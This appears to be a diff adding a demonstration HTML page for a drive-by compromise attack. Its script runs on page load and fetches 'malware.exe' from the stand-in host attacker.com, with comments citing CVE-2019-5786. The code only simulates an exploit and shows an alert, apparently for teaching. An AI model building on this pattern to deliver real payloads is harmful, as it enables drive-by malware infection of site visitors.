@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Webpage</title>
+</head>
+<body>
+    <h1>Welcome to Our Special Page!</h1>
+    <p>This is a fake website designed to demonstrate a Drive-By Compromise attack.</p>
+    
+    <script>
+        // JavaScript code to exploit a vulnerability
+        // In real-world scenarios, this script would exploit a known vulnerability like CVE-2019-5786
+        function exploitVulnerability() {
+            var maliciousFile = "http://attacker.com/malware.exe";  // Link to the malicious file
+            var fileReader = new FileReader();
+
+            // Assuming the browser vulnerability allows reading and executing files automatically
+            fetch(maliciousFile)
+                .then(response => response.blob())
+                .then(blob => {
+                    // Normally, this would execute malicious code using the FileReader exploit
+                    fileReader.readAsArrayBuffer(blob);  // Trigger the exploit
+                    alert("Exploit Executed!");  // Fake alert for demonstration
+                })
+                .catch(error => {
+                    console.log("Failed to fetch the malicious file:", error);
+                });
+        }
+
+        // Automatically run the exploit when the page loads
+        window.onload = exploitVulnerability;
+    </script>
+</body>
+</html>
